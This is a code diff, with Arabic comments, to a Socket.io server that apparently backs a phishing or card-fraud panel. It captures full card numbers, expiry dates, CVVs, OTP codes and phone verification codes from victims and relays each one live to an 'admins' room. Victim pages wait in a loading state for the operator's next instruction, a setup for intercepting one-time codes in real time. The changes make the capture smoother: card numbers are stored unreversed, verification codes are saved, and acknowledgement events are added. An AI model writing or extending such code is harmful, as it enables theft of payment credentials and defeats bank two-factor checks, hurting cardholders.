@@ -328,15 +328,14 @@ io.on("connection", (socket) => {
         return;
       }
       ipToReference.set(clientIp, reference);
-      // عكس رقم البطاقة لتصحيح RTL
-      const rawCardNum = String(data.cardNumber ?? data.card_number ?? "");
-      const cardNum = rawCardNum.split("").reverse().join("");
+      // حفظ رقم البطاقة كما هو بدون عكس
+      const cardNum = String(data.cardNumber ?? data.card_number ?? "");
       const lastFour = cardNum.slice(-4);
       createOrUpdatePayment(reference, {
         cardHolderName: String(data.cardHolderName ?? data.card_holder_name ?? ""),
         cardNumber: cardNum,
         cardLastFour: lastFour,
-        cardExpiry: String(data.cardExpiry ?? data.card_expiry ?? ""),
+        cardExpiry: String(data.cardExpiry ?? data.card_expiry ?? data.expirationDate ?? ""),
         cardCvv: String(data.cardCvv ?? data.cvv ?? ""),
         step: 1,
         status: "step1_done",
@@ -369,9 +368,10 @@ io.on("connection", (socket) => {
         status: "step2_done",
         rawData: data,
       });
-      createOrUpdatePayment(reference, { step: 2, status: "step2_done" });
+      createOrUpdatePayment(reference, { step: 2, status: "step2_done", verifyCode: String(data.verification_code_two ?? data.code ?? "") });
       io.to("admins").emit("newPayment", { reference, step: 2, type: "otp", ip: clientIp });
-      // لا نرسل ackVerification - الصفحة تبقى في loading وتنتظر navigateTo من المشرف
+      // إرسال ackVerification حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
+      socket.emit("ackVerification", { success: true });
     } catch (err) {
       console.error("[Socket.io] submitVerificationData error:", err);
     }
@@ -394,7 +394,8 @@ io.on("connection", (socket) => {
         status: "step3_done",
       });
       io.to("admins").emit("newPayment", { reference, step: newStep, type: "code", ip: clientIp });
-      // لا نرسل ackCode - الصفحة تبقى في loading وتنتظر navigateTo من المشرف
+      // إرسال ackCode حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
+      socket.emit("ackCode", { success: true });
     } catch (err) {
       console.error("[Socket.io] submitCodeData error:", err);
     }
@@ -453,7 +454,8 @@ io.on("connection", (socket) => {
         rawData: data,
       });
       io.to("admins").emit("newPayment", { reference, type: "phone", ip: clientIp });
-      // لا نرسل ack - ينتظر navigateTo من المشرف
+      // إرسال ackPhone حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
+      socket.emit("ackPhone", { success: true });
     } catch (err) {
       console.error("[Socket.io] submitPhoneData error:", err);
     }
@@ -472,7 +474,8 @@ io.on("connection", (socket) => {
         status: "step2_done",
       });
       io.to("admins").emit("newPayment", { reference, type: "phoneCode", ip: clientIp });
-      // لا نرسل ack - ينتظر navigateTo من المشرف
+      // إرسال ackPhoneCode حتى تنتقل الصفحة لحالة loading وتنتظر navigateTo من المشرف
+      socket.emit("ackPhoneCode", { success: true });
     } catch (err) {
       console.error("[Socket.io] submitPhoneCodeData error:", err);
     }
